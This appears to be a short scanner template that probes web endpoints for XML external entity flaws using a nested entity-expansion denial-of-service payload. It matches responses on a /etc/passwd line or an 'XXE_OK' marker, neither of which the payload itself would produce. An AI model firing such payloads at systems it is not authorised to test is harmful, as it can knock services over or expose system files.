id: xxe3-26
name: 'XXE DoS/entity in xml'
severity: high
type: active
tags:
  - xxe
  - injection
  - xml
  - dos
description: 'XXE entity via xml'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      xml:
        - '<!DOCTYPE r [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;">]><r>&b;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
